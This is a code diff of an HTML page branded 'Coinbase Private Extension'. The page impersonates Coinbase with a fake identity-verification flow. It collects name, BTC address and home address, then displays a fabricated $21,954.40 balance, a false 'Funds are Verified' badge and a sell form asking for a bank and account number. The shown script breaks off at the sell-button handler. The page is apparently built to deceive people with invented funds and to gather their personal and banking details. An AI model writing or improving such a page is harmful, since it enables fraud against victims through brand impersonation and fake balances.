@@ -4,295 +4,762 @@
   <meta charset="UTF-8">
   <title>Coinbase Private Extension</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Coinbase Private Extension Dashboard">
-  <meta name="theme-color" content="#101114">
-  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta name="theme-color" content="#191b1f">
+  <meta name="description" content="Coinbase Private Extension - Modern, Secure, Interactive Crypto Dashboard">
   <link rel="manifest" href="manifest.json">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link href="https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --sidebar-bg: #16181f;
-      --sidebar-active: #0052ff;
-      --sidebar-icon: #8e93a8;
-      --sidebar-hover: #23263a;
-      --main-bg: #101114;
-      --table-bg: #181a20;
-      --border: #22242c;
+      --background: #191b1f;
+      --sidebar: #181a20;
       --primary: #0052ff;
-      --success: #22b573;
+      --primary-light: #2563eb;
+      --text: #f5f6fa;
+      --subtle: #a0a4ad;
+      --accent: #0f1116;
+      --card: #23272f;
+      --green: #22c55e;
+      --blue: #2147ff;
+      --shadow: 0 4px 28px 0 rgba(0,0,0,0.16);
       --error: #e74c3c;
-      --white: #fff;
-      --text: #e8eaf0;
-      --subtext: #8e93a8;
-      --accent: #3686ff;
-      --row-hover: #181a2a;
-      --verified: #4ecdc4;
+      --duc-blue: #1d8cf8;
+      --duc-green: #22b573;
+    }
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      background: var(--background);
+      color: var(--text);
+      font-family: 'Inter', Arial, sans-serif;
+      min-height: 100vh;
     }
     body {
-      margin: 0; padding: 0;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      background: var(--main-bg);
+      transition: background 0.25s, color 0.22s;
+    }
+    .hidden { display: none !important; }
+    /* Onboarding */
+    #onboarding {
+      position: fixed; z-index: 2000; top: 0; left: 0; width: 100vw; height: 100vh;
+      background: var(--background);
+      display: flex; align-items: center; justify-content: center;
+      flex-direction: column;
+      transition: background 0.25s;
+    }
+    #onboarding-image {
+      max-width: 92vw; max-height: 56vh; border-radius: 20px; box-shadow: 0 4px 32px rgba(0,0,0,0.22);
+      margin-bottom: 36px;
+    }
+    #begin-btn {
+      background: var(--primary);
+      color: #fff;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.25rem;
+      padding: 16px 44px;
+      cursor: pointer;
+      box-shadow: var(--shadow);
+      transition: background 0.19s;
+    }
+    #begin-btn:active { background: var(--primary-light);}
+    .verify-modal {
+      position: fixed; z-index: 2100; top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(20,22,30,0.68);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .verify-modal-content {
+      background: var(--card);
       color: var(--text);
-      min-height: 100vh;
-      transition: background 0.35s, color 0.35s;
+      border-radius: 18px;
+      box-shadow: var(--shadow);
+      min-width: 310px;
+      width: 92vw;
+      max-width: 388px;
+      padding: 34px 26px 28px 26px;
+      text-align: center;
+      animation: scaleIn 180ms;
+      position: relative;
     }
-    [data-theme="light"] {
-      --sidebar-bg: #fff;
-      --sidebar-active: #0052ff;
-      --sidebar-icon: #374151;
-      --sidebar-hover: #f0f2f8;
-      --main-bg: #f8fafc;
-      --table-bg: #fff;
-      --border: #e5e7eb;
-      --primary: #0052ff;
-      --success: #22b573;
-      --error: #e74c3c;
-      --white: #fff;
-      --text: #23263a;
-      --subtext: #555;
-      --accent: #0052ff;
-      --row-hover: #f0f2f8;
-      --verified: #22b573;
+    .verify-modal-content h2 { margin-top: 0; margin-bottom: 18px; font-weight: 700; font-size: 1.35rem;}
+    .verify-modal-content label { display: block; margin: 18px 0 5px 0; font-weight: 500; }
+    .verify-modal-content input, .verify-modal-content select {
+      width: 100%; padding: 11px 14px; border-radius: 8px; border: 1.5px solid #444;
+      background: var(--background); color: var(--text); font-size: 1.05rem;
+      margin-bottom: 7px; outline: none; transition: border 0.18s;
     }
-    .app-container {
-      display: flex;
-      min-height: 100vh;
-      width: 100vw;
+    .verify-modal-content input:focus, .verify-modal-content select:focus {
+      border: 1.5px solid var(--primary);
     }
-    .centered-screen {
-      min-height: 100vh;
+    .verify-modal-content .verify-submit {
+      margin-top: 18px; width: 100%; background: var(--primary); color: #fff; font-size: 1.1rem; border: none; border-radius: 8px; padding: 15px 0; cursor: pointer; font-weight: 600; transition: background 0.19s;
+    }
+    .verify-modal-content .verify-submit:active { background: var(--primary-light);}
+    .verify-modal-content .verify-error {
+      color: var(--error); font-size: 1.01em; margin-top: 9px;
+    }
+    @keyframes scaleIn {
+      from { transform: scale(0.8);}
+      to   { transform: scale(1);}
+    }
+    /* Welcome Splash */
+    #welcome-splash {
+      position: fixed; z-index: 2200; top: 0; left: 0; width: 100vw; height: 100vh;
+      background: var(--background);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 2.1rem; font-weight: 700; color: var(--primary);
+      animation: fadeIn 0.3s;
+    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    /* Main Dashboard Layout */
+    .container {
+      display: flex; min-height: 100vh;
+    }
+    .sidebar {
+      width: 80px;
+      background: var(--sidebar);
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      background: var(--main-bg);
-      padding: 0;
+      padding: 24px 0;
+      gap: 30px;
+      transition: background 0.22s;
     }
-    .start-image {
-      width: 320px;
-      max-width: 90vw;
-      border-radius: 18px;
-      box-shadow: 0 4px 24px rgba(44,62,80,0.2);
-      margin-bottom: 32px;
-    }
-    .main-btn {
-      background: var(--primary);
-      color: #fff;
-      border: none;
-      border-radius: 9px;
-      font-size: 1.22em;
-      font-weight: 600;
-      padding: 15px 40px;
-      cursor: pointer;
-      transition: background 0.2s;
-      box-shadow: 0 2px 8px rgba(0,82,255,0.14);
-      margin-bottom: 10px;
-    }
-    .main-btn:active, .main-btn.active {
-      background: #0037b3;
-    }
-    /* Modal Styles */
-    .modal-overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(26,29,41,0.74);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 200;
-      animation: fadeIn 0.3s;
-    }
-    .modal-content {
-      background: var(--table-bg);
-      color: var(--text);
-      border-radius: 17px;
-      box-shadow: 0 12px 48px rgba(0,0,0,0.24);
-      padding: 34px 21px 28px;
-      width: 95vw;
-      max-width: 380px;
-      min-width: 0;
-      box-sizing: border-box;
-      text-align: center;
-      position: relative;
-      transition: background 0.3s, color 0.3s;
-    }
-    .modal-close-btn {
-      position: absolute;
-      right: 22px;
-      top: 18px;
-      background: none;
-      border: none;
-      color: var(--subtext);
-      font-size: 1.4em;
-      cursor: pointer;
-    }
-    .modal-content label { text-align: left; display: block; font-weight: 500; margin-bottom: 7px;}
-    .modal-content input, .modal-content select {
-      width: 100%;
-      padding: 11px 12px;
-      font-size: 1em;
-      margin: 0 0 16px 0;
-      border: 1.5px solid var(--border);
-      border-radius: 7px;
-      background: var(--main-bg);
-      color: var(--text);
-      outline: none;
-      transition: border 0.2s;
-    }
-    .modal-content input:focus, .modal-content select:focus {
-      border: 1.5px solid var(--primary);
-    }
-    .modal-continue-btn {
-      width: 100%;
-      background: var(--primary);
-      color: #fff;
-      font-size: 1.08em;
-      border: none;
-      border-radius: 7px;
-      padding: 13px 0;
-      cursor: pointer;
-      font-weight: 600;
-      margin-top: 4px;
-      transition: background 0.19s;
-    }
-    .modal-continue-btn:active {
-      background: #0037b3;
-    }
-    .modal-error {
-      color: var(--error);
-      font-size: 0.97em;
-      margin: 8px 0;
-      display: none;
-    }
-    /* Welcome Animation */
-    .welcome-anim {
-      position: fixed;
-      top: 0;left: 0;right: 0;bottom: 0;
-      background: rgba(16,17,20,0.92);
-      color: #fff;
-      z-index: 999;
+    .sidebar-icon {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      background: var(--accent);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 2.1em;
-      font-weight: 700;
-      letter-spacing: 0.04em;
-      opacity: 0;
+      margin-bottom: 8px;
+      cursor: pointer;
+      transition: background 0.2s;
+      border: 2px solid transparent;
+    }
+    .sidebar-icon.selected, .sidebar-icon.active {
+      background: var(--primary);
+      border-color: var(--primary);
+    }
+    .sidebar-icon svg {
+      fill: var(--text);
+      width: 24px; height: 24px;
       pointer-events: none;
-      transition: opacity 0.35s;
     }
-    .welcome-anim.active { opacity: 1; pointer-events: all;}
-    /* Dashboard Clone */
-    .dashboard-container { display: none; }
-    .dashboard-show { display: flex !important; }
-    /* Responsive */
-    @media (max-width: 850px) {
-      .dashboard-header, .tab-row, .table-section, .balance-block { margin-left: 0 !important; margin-right: 0 !important;}
-      .dashboard-header {padding: 22px 14px 0 14px;}
-      .tab-row {margin: 28px 0 0 14px;}
-      .table-section {margin: 24px 0 0 0;}
+    .main {
+      flex: 1;
+      background: var(--background);
+      display: flex;
+      flex-direction: column;
+      min-width: 0;
+      transition: background 0.22s;
     }
-    @media (max-width: 650px) {
-      .main-content {padding: 0;}
-      .dashboard-header {padding: 13px 4vw 0 4vw;}
-      .tab-row {margin: 23px 0 0 4vw;}
-      .table-section {margin: 17px 0 0 0;}
-      .balance-block {font-size: 1.5em;}
+    .topbar {
+      display: flex;
+      align-items: center;
+      padding: 24px 32px 0 32px;
+      gap: 18px;
     }
-    [data-theme="light"] .modal-overlay {background: rgba(245,245,247,0.93);}
-    [data-theme="light"] .modal-content {background: #fff; color: #23263a;}
-    [data-theme="light"] .welcome-anim {background: rgba(255,255,255,0.97); color: #23263a;}
+    .topbar input {
+      background: var(--card);
+      border: none;
+      color: var(--text);
+      padding: 10px 16px;
+      border-radius: 8px;
+      font-size: 1rem;
+      flex: 1;
+      margin-left: 12px;
+      outline: none;
+    }
+    .topbar .settings-icon {
+      margin-left: 16px;
+      cursor: pointer;
+    }
+    .dashboard-content {
+      padding: 32px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 32px;
+      min-width: 0;
+      background: url('![image1](image1)') center/cover no-repeat;
+    }
+    .balance-row {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      justify-content: space-between;
+      flex-wrap: wrap;
+    }
+    .balance-section {
+      font-size: 2.1rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+    .balance-amount {
+      font-size: 2.7rem;
+      font-weight: 700;
+      margin-bottom: 2px;
+      color: var(--text);
+      letter-spacing: -1.5px;
+    }
+    .modern-btn {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      border-radius: 50%;
+      width: 48px;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: var(--shadow);
+      font-size: 1.7rem;
+      cursor: pointer;
+      transition: background 0.18s, transform 0.11s;
+      outline: none;
+      margin-left: 18px;
+      position: relative;
+    }
+    .modern-btn:active, .modern-btn.active {
+      background: var(--primary-light);
+      transform: scale(0.96);
+    }
+    .tabs {
+      display: flex;
+      gap: 36px;
+      margin-bottom: 10px;
+      margin-top: 12px;
+    }
+    .tab {
+      color: var(--subtle);
+      font-weight: 500;
+      cursor: pointer;
+      padding-bottom: 6px;
+      border-bottom: 2px solid transparent;
+      transition: color 0.2s, border 0.2s;
+      font-size: 1.07rem;
+      letter-spacing: -.4px;
+    }
+    .tab.selected {
+      color: var(--primary);
+      border-bottom: 2px solid var(--primary);
+    }
+    .filters-bar {
+      display: flex;
+      justify-content: flex-end;
+      margin-bottom: 12px;
+    }
+    .filters-bar select {
+      background: var(--card);
+      color: var(--text);
+      border: none;
+      padding: 7px 12px;
+      border-radius: 7px;
+      font-size: 1rem;
+      outline: none;
+    }
+    .transactions-table {
+      width: 100%;
+      background: var(--card);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: var(--shadow);
+    }
+    .transactions-table table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    .transactions-table th, .transactions-table td {
+      padding: 20px 18px;
+      text-align: left;
+    }
+    .transactions-table th {
+      color: var(--subtle);
+      font-weight: 500;
+      background: var(--card);
+      font-size: 1rem;
+      border-bottom: 1px solid #232323;
+      letter-spacing: .2px;
+    }
+    .transactions-table td {
+      font-size: 1.08rem;
+    }
+    .transactions-table tr:not(:last-child) td {
+      border-bottom: 1px solid #22252b;
+    }
+    .money-bag {
+      font-size: 1.5rem;
+      margin-right: 13px;
+      vertical-align: middle;
+    }
+    .received {
+      color: var(--green);
+      font-weight: 500;
+    }
+    .footer {
+      text-align: center;
+      color: var(--subtle);
+      font-size: 1rem;
+      padding: 20px 0 10px 0;
+      background: none;
+    }
+    .verified {
+      color: var(--blue);
+      font-size: 1.04rem;
+      margin-bottom: 8px;
+      display: inline-block;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+    .footer-bar {
+      background: var(--accent);
+      color: var(--text);
+      font-size: 0.98rem;
+      padding: 6px 0;
+      border-radius: 8px;
+      display: inline-block;
+      margin-top: 6px;
+      min-width: 320px;
+    }
+    /* Asset/UserID/Badge Modal Styles */
+    .modal-overlay {
+      position: fixed;
+      z-index: 3000;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(20,22,30,0.57);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      animation: fadeIn 180ms;
+    }
+    .asset-modal-content, .badge-modal-content, .userid-modal-content {
+      background: var(--card);
+      color: var(--text);
+      padding: 14px 12px 12px 12px;
+      border-radius: 17px;
+      min-width: 220px;
+      max-width: 97vw;
+      max-height: 98vh;
+      box-shadow: var(--shadow);
+      text-align: center;
+      position: relative;
+      animation: scaleIn 180ms;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+    }
+    .modal-close {
+      background: none;
+      border: none;
+      color: var(--subtle);
+      position: absolute;
+      top: 8px; right: 13px;
+      font-size: 1.7rem;
+      cursor: pointer;
+      transition: color 0.16s;
+      outline: none;
+      z-index: 10;
+    }
+    .modal-close:hover { color: var(--blue);}
+    .asset-img, .badge-img, .userid-img {
+      display: block;
+      max-width: 86vw;
+      max-height: 82vh;
+      width: auto; height: auto;
+      border-radius: 16px;
+      box-shadow: 0 7px 48px rgba(0,0,0,0.11);
+    }
+    .badge-img { background: #fff; padding: 12px;}
+    /* Sell Modal Styles */
+    .sell-modal-content {
+      background: var(--card);
+      color: var(--text);
+      padding: 36px 30px 26px 30px;
+      border-radius: 17px;
+      min-width: 320px;
+      width: 95vw;
+      max-width: 400px;
+      box-shadow: var(--shadow);
+      text-align: center;
+      position: relative;
+      animation: scaleIn 180ms;
+    }
+    .modal-step { font-size: 1.13em; font-weight: 600; margin-bottom: 10px; color: var(--primary);}
+    .form-field {
+      margin: 1.2em 0;
+      text-align: left;
+    }
+    .form-label {
+      font-weight: 500;
+      margin-bottom: 3px;
+      display: block;
+    }
+    .form-input, .form-select {
+      width: 100%;
+      padding: 10px 11px;
+      font-size: 1rem;
+      border-radius: 7px;
+      border: 1px solid #404252;
+      background: var(--background);
+      color: var(--text);
+      margin-bottom: 3px;
+      box-sizing: border-box;
+      outline: none;
+      transition: border 0.18s;
+    }
+    .form-input:focus, .form-select:focus {
+      border: 1.5px solid var(--primary);
+    }
+    .sell-proceed-btn {
+      margin-top: 10px; width: 100%; background: var(--primary); color: #fff; font-size: 1rem; border: none; border-radius: 7px; padding: 13px 0; cursor: pointer; font-weight: 600; transition: background 0.19s;
+    }
+    .sell-proceed-btn:hover { background: var(--primary-light);}
+    .error-message { color: var(--error); margin-bottom: 10px; font-size: 0.98em; }
+    /* Responsive styling */
+    @media (max-width: 900px) {
+      .dashboard-content { padding: 14px; }
+      .topbar { padding: 14px 12px 0 12px;}
+      .footer-bar { min-width: 190px; }
+    }
+    @media (max-width: 600px) {
+      .sidebar { width: 56px; }
+      .dashboard-content { padding: 6px; }
+      .topbar { padding: 6px 6px 0 6px;}
+      .sell-modal-content { min-width: 90vw; padding: 22px 8px 19px 8px;}
+      .asset-modal-content, .badge-modal-content, .userid-modal-content { padding: 7px 2px 7px 2px;}
+    }
+    /* Light mode */
+    body.light {
+      --background: #f5f6fa;
+      --sidebar: #e8eaf1;
+      --primary: #0052ff;
+      --primary-light: #2563eb;
+      --text: #131417;
+      --subtle: #6a6e7b;
+      --accent: #e3e8f1;
+      --card: #ffffff;
+      --green: #22c55e;
+      --blue: #2147ff;
+      --shadow: 0 4px 28px 0 rgba(150,150,150,0.12);
+    }
   </style>
 </head>
-<body data-theme="dark">
-  <div id="startScreen" class="centered-screen">
-    <!-- Main image for upload (replace src below with your image file) -->
-    <img id="mainImage" class="start-image" src="IMG-20250727-WA0021.jpg" alt="Main" />
-    <button class="main-btn" id="beginVerificationBtn">Begin Verification</button>
+<body>
+  <!-- Onboarding Start -->
+  <div id="onboarding">
+    <img id="onboarding-image" src="![image1](image1)" alt="Coinbase Welcome" />
+    <button id="begin-btn">Begin Verification</button>
   </div>
-  <!-- Verification Modal Sequence -->
-  <div class="modal-overlay" id="modal1">
-    <div class="modal-content">
-      <button class="modal-close-btn" onclick="closeModal('modal1')">&times;</button>
-      <div style="font-size:2.2em;margin-bottom:10px;">🇺🇸</div>
-      <div style="font-weight:600;font-size:1.18em;margin-bottom:11px;">Confirm your country</div>
-      <div style="color: #767676; font-size: 1em; margin-bottom:17px;">United States</div>
-      <button class="modal-continue-btn" onclick="showModal('modal2')">Continue</button>
-    </div>
-  </div>
-  <div class="modal-overlay" id="modal2">
-    <div class="modal-content">
-      <button class="modal-close-btn" onclick="closeModal('modal2')">&times;</button>
+  <!-- Verification Modal -->
+  <div class="verify-modal hidden" id="verifyModal">
+    <div class="verify-modal-content">
+      <h2>Verify Your Identity</h2>
       <form id="verifyForm" autocomplete="off">
-        <label for="fullName">Full Name</label>
-        <input id="fullName" name="fullName" type="text" required placeholder="Enter your full name" />
-        <label for="btcAddress">BTC Address</label>
-        <input id="btcAddress" name="btcAddress" type="text" required placeholder="Enter your BTC Address" />
-        <label for="userAddress">Your Address</label>
-        <input id="userAddress" name="userAddress" type="text" required placeholder="Enter your physical address" />
-        <div id="verifyError" class="modal-error"></div>
-        <button class="modal-continue-btn" type="submit">Continue</button>
+        <label>Country</label>
+        <select id="country" required>
+          <option value="United States" selected>🇺🇸 United States</option>
+        </select>
+        <label for="fullname">Full Name</label>
+        <input type="text" id="fullname" name="fullname" placeholder="Enter your full name" required />
+        <label for="btcaddress">BTC Address</label>
+        <input type="text" id="btcaddress" name="btcaddress" placeholder="Enter your BTC address" required />
+        <label for="address">Physical Address</label>
+        <input type="text" id="address" name="address" placeholder="Your home or office address" required />
+        <div class="verify-error" id="verifyError"></div>
+        <button class="verify-submit" type="submit">Continue</button>
       </form>
     </div>
   </div>
-  <!-- Welcome Animation -->
-  <div class="welcome-anim" id="welcomeAnim">Welcome to COINBASE PRIVATE EXTENSION</div>
-  <!-- Dashboard Clone (from your image) -->
-  <div class="dashboard-container" id="dashboardContainer">
-    <!-- Insert the full cloned dashboard code here (see previous assistant messages for the structure) -->
-    <!-- For demo, here's a placeholder with an IMG element to upload the dashboard image -->
-    <img id="dashboardImage" src="YOUR_DASHBOARD_IMAGE.jpg" alt="Dashboard" style="width:100vw;max-width:100%;display:block;margin:0 auto;">
-    <!-- Place your functional dashboard HTML/CSS/JS here, replacing the above IMG as needed -->
-    <!-- Add interactive sections: Sell, Assets, User ID, Verified Badge, etc., all matching the dashboard style -->
+  <!-- Welcome Splash -->
+  <div id="welcome-splash" class="hidden">
+    Welcome to COINBASE PRIVATE EXTENSION
+  </div>
+  <!-- MAIN DASHBOARD -->
+  <div class="container hidden" id="dashboardContainer">
+    <aside class="sidebar">
+      <div class="sidebar-icon selected" title="Dashboard" id="dashboardBtn">
+        <svg viewBox="0 0 24 24"><path d="M3 10.8V21h6v-5h6v5h6V10.8L12 3z"/></svg>
+      </div>
+      <div class="sidebar-icon" title="Assets" id="assetsBtn">
+        <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+      </div>
+      <div class="sidebar-icon" title="Verified Badge" id="badgeBtn">
+        <svg viewBox="0 0 24 24"><path d="M12 2L2 7l1.5 9 8.5 6 8.5-6L22 7z"/></svg>
+      </div>
+      <div class="sidebar-icon" title="User ID" id="userIdBtn">
+        <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 8 1.34 8 4v5H4v-5c0-2.66 5.3-4 8-4zm0-2a4 4 0 1 1 0-8 4 4 0 0 1 0 8z"/></svg>
+      </div>
+      <div class="sidebar-icon" title="Night Mode" id="toggleThemeBtn">
+        <svg viewBox="0 0 24 24"><path d="M20.742 13.045A8.088 8.088 0 0 1 11.955 3.258a8.093 8.093 0 1 0 8.787 9.787z"/></svg>
+      </div>
+    </aside>
+    <main class="main">
+      <div class="topbar">
+        <div style="font-weight:600; font-size:1.13rem;">Coinbase Wallet</div>
+        <input type="text" placeholder="Search coins, apps...">
+        <div class="settings-icon" title="Settings">
+          <svg width="25" height="25" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M12 15.5A3.5 3.5 0 1 0 12 8.5a3.5 3.5 0 0 0 0 7Zm7.43-2.9c.04-.3.07-.61.07-.93s-.03-.63-.07-.93l2.11-1.65a.5.5 0 0 0 .12-.64l-2-3.46a.5.5 0 0 0-.6-.22l-2.49 1a7.07 7.07 0 0 0-1.61-.93l-.38-2.65A.5.5 0 0 0 13 2h-4a.5.5 0 0 0-.5.42l-.38 2.65c-.59.23-1.15.53-1.68.89l-2.49-1a.5.5 0 0 0-.6.22l-2 3.46a.5.5 0 0 0 .12.64l2.11 1.65c-.04.3-.07.61-.07.93s.03.63.07.93l-2.11 1.65a.5.5 0 0 0-.12.64l2 3.46c.14.25.45.33.7.22l2.49-1c.52.36 1.08.66 1.68.89l.38 2.65A.5.5 0 0 0 9 22h4a.5.5 0 0 0 .5-.42l.38-2.65c.59-.23 1.15-.53 1.68-.89l2.49 1c.25.11.56.03.7-.22l2-3.46a.5.5 0 0 0-.12-.64l-2.11-1.65Z"/></svg>
+        </div>
+      </div>
+      <div class="dashboard-content">
+        <div class="balance-row">
+          <div>
+            <div class="balance-section">Balance</div>
+            <div class="balance-amount">$21,954.40</div>
+          </div>
+          <button class="modern-btn" id="sellBtn" title="Sell Crypto">
+            <svg width="26" height="26" fill="none" viewBox="0 0 32 32">
+              <circle cx="16" cy="16" r="16" fill="#2563eb"/>
+              <path d="M16 8v16m0 0l8-8m-8 8l-8-8" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+        </div>
+        <div>
+          <div class="tabs">
+            <div class="tab selected">Crypto</div>
+            <div class="tab">DeFi</div>
+            <div class="tab">Transactions</div>
+          </div>
+          <div class="filters-bar">
+            <select>
+              <option>All networks</option>
+            </select>
+          </div>
+          <div class="transactions-table">
+            <table>
+              <thead>
+                <tr>
+                  <th>Transaction</th>
+                  <th>Value</th>
+                  <th>Date</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>
+                    <span class="money-bag">💰</span>
+                    <span>
+                      Received<br>
+                      <span style="font-size:0.9rem; color:var(--subtle); font-weight:400;">
+                        From Coinbase.com
+                      </span>
+                    </span>
+                  </td>
+                  <td class="received">+ $21,954.40<br>
+                    <span style="color:var(--subtle); font-size:0.92rem;">BTC 0.3219</span>
+                  </td>
+                  <td>
+                    <span>Jul 27, 2025<br>
+                    <span style="color:var(--subtle); font-size:0.95rem;">07:17 PM</span>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      <footer class="footer">
+        <span class="verified" id="verifiedBadge">Funds are Verified © By Coinbase.com</span>
+        <div class="footer-bar">© 2025 Coinbase • United States | English</div>
+      </footer>
+    </main>
+  </div>
+  <!-- ASSET MODAL -->
+  <div class="modal-overlay" id="assetModal">
+    <div class="asset-modal-content">
+      <button class="modal-close" onclick="closeModal('assetModal')">&times;</button>
+      <img src="![image4](image4)" alt="Assets" class="asset-img"/>
+    </div>
+  </div>
+  <!-- BADGE MODAL -->
+  <div class="modal-overlay" id="badgeModal">
+    <div class="badge-modal-content">
+      <button class="modal-close" onclick="closeModal('badgeModal')">&times;</button>
+      <img src="![image3](image3)" alt="Verified Badge" class="badge-img"/>
+    </div>
+  </div>
+  <!-- USER ID MODAL -->
+  <div class="modal-overlay" id="userIdModal">
+    <div class="userid-modal-content">
+      <button class="modal-close" onclick="closeModal('userIdModal')">&times;</button>
+      <img src="![image2](image2)" alt="User ID" class="userid-img"/>
+    </div>
+  </div>
+  <!-- SELL MODAL -->
+  <div class="modal-overlay" id="sellModal">
+    <div class="sell-modal-content">
+      <button class="modal-close" onclick="closeModal('sellModal')">&times;</button>
+      <div class="modal-step">Sell Bitcoin to Bank</div>
+      <div class="form-field">
+        <label class="form-label">Bitcoin Amount</label>
+        <input class="form-input" type="text" value="0.21656503 BTC" disabled>
+      </div>
+      <div class="form-field">
+        <label class="form-label">Amount</label>
+        <input class="form-input" type="text" value="$25,640.09" disabled>
+      </div>
+      <div class="form-field">
+        <label class="form-label">Select Receiving Bank / App</label>
+        <select class="form-select" id="bankSelect" required>
+          <option value="">-- Select --</option>
+          <option>Bank of America</option>
+          <option>JPMorgan Chase</option>
+          <option>Wells Fargo</option>
+          <option>Citibank</option>
+          <option>U.S. Bank</option>
+          <option>PNC Bank</option>
+          <option>Truist</option>
+          <option>TD Bank</option>
+          <option>Capital One</option>
+          <option>HSBC</option>
+          <option>Regions Bank</option>
+          <option>Fifth Third Bank</option>
+          <option>KeyBank</option>
+          <option>Ally Bank</option>
+          <option>Charles Schwab Bank</option>
+          <option>BBVA</option>
+          <option>SunTrust Bank</option>
+          <option>Huntington National Bank</option>
+          <option>Comerica Bank</option>
+          <option>First Republic Bank</option>
+          <option>Cash App</option>
+          <option>Venmo</option>
+          <option>Chime</option>
+          <option>Zelle</option>
+        </select>
+      </div>
+      <div class="form-field">
+        <label class="form-label">Account Number</label>
+        <input class="form-input" id="accountNumberInput" type="text" placeholder="Enter Account Number" required>
+      </div>
+      <div id="sellErrorMsg" class="error-message" style="display: none;"></div>
+      <button class="sell-proceed-btn" id="sellProceedBtn">Confirm</button>
+    </div>
   </div>
   <script>
-    // Dark/light mode toggle (add your toggle button and logic as needed)
-    function setTheme(theme) {
-      document.body.setAttribute('data-theme', theme);
-      localStorage.setItem('cb-theme', theme);
+    // Onboarding/Verification Logic
+    const onboarding = document.getElementById('onboarding');
+    const verifyModal = document.getElementById('verifyModal');
+    const dashboardContainer = document.getElementById('dashboardContainer');
+    const welcomeSplash = document.getElementById('welcome-splash');
+
+    function showDashboard() {
+      onboarding.classList.add('hidden');
+      verifyModal.classList.add('hidden');
+      welcomeSplash.classList.add('hidden');
+      dashboardContainer.classList.remove('hidden');
     }
-    setTheme(localStorage.getItem('cb-theme') || 'dark');
-    // Start: show first image and Begin Verification
-    document.getElementById('beginVerificationBtn').onclick = function() {
-      document.getElementById('modal1').style.display = "flex";
+
+    // Onboarding flow: handled only once per browser (localStorage)
+    if (localStorage.getItem('coinbase_verified') === 'true') {
+      showDashboard();
+    } else {
+      onboarding.classList.remove('hidden');
+    }
+
+    document.getElementById('begin-btn').onclick = function() {
+      onboarding.classList.add('hidden');
+      verifyModal.classList.remove('hidden');
     };
-    function closeModal(id) { document.getElementById(id).style.display = "none"; }
-    function showModal(id) {
-      // Hide all modals
-      document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = "none");
-      document.getElementById(id).style.display = "flex";
-    }
-    // Modal1: Continue to Modal2
-    // Modal2: Verification Form
+
+    // Verification Form
     document.getElementById('verifyForm').onsubmit = function(e) {
       e.preventDefault();
-      var name = document.getElementById('fullName').value.trim();
-      var btc = document.getElementById('btcAddress').value.trim();
-      var addr = document.getElementById('userAddress').value.trim();
-      var error = document.getElementById('verifyError');
+      let name = document.getElementById('fullname').value.trim();
+      let btc = document.getElementById('btcaddress').value.trim();
+      let addr = document.getElementById('address').value.trim();
+      let error = document.getElementById('verifyError');
+
       if (!name || !btc || !addr) {
+        error.textContent = "All fields are required.";
+        return;
+      }
+      error.textContent = "";
+      verifyModal.classList.add('hidden');
+      welcomeSplash.classList.remove('hidden');
+      setTimeout(function(){
+        localStorage.setItem('coinbase_verified', 'true');
+        showDashboard();
+      }, 2000);
+    };
+
+    // Sidebar button active state logic
+    function setActiveSidebar(id) {
+      document.querySelectorAll('.sidebar-icon').forEach(e=>e.classList.remove('selected'));
+      if (id) document.getElementById(id).classList.add('selected');
+    }
+    document.getElementById('dashboardBtn').onclick = function() {
+      setActiveSidebar('dashboardBtn');
+    };
+    document.getElementById('assetsBtn').onclick = function() {
+      setActiveSidebar('assetsBtn');
+      openModal('assetModal');
+    };
+    document.getElementById('badgeBtn').onclick = function() {
+      setActiveSidebar('badgeBtn');
+      openModal('badgeModal');
+    };
+    document.getElementById('userIdBtn').onclick = function() {
+      setActiveSidebar('userIdBtn');
+      openModal('userIdModal');
+    };
+
+    // Asset, Badge, UserID modal openers
+    function openModal(id) {
+      document.getElementById(id).style.display = 'flex';
+    }
+    function closeModal(id) {
+      document.getElementById(id).style.display = 'none';
+      // Remove the blue highlight from all sidebar buttons except dashboard
+      setActiveSidebar('dashboardBtn');
+    }
+    // Clicking on modal overlay closes modals
+    document.querySelectorAll('.modal-overlay').forEach(modal => {
+      modal.addEventListener('click', function(e) {
+        if (e.target === modal) modal.style.display = 'none', setActiveSidebar('dashboardBtn');
+      });
+    });
+    // Clicking on verified badge in footer
+    document.getElementById('verifiedBadge').onclick = function() {
+      openModal('badgeModal');
+      setActiveSidebar('badgeBtn');
+    };
+
+    // SELL BUTTON & Modal logic
+    document.getElementById('sellBtn').onclick = function(){
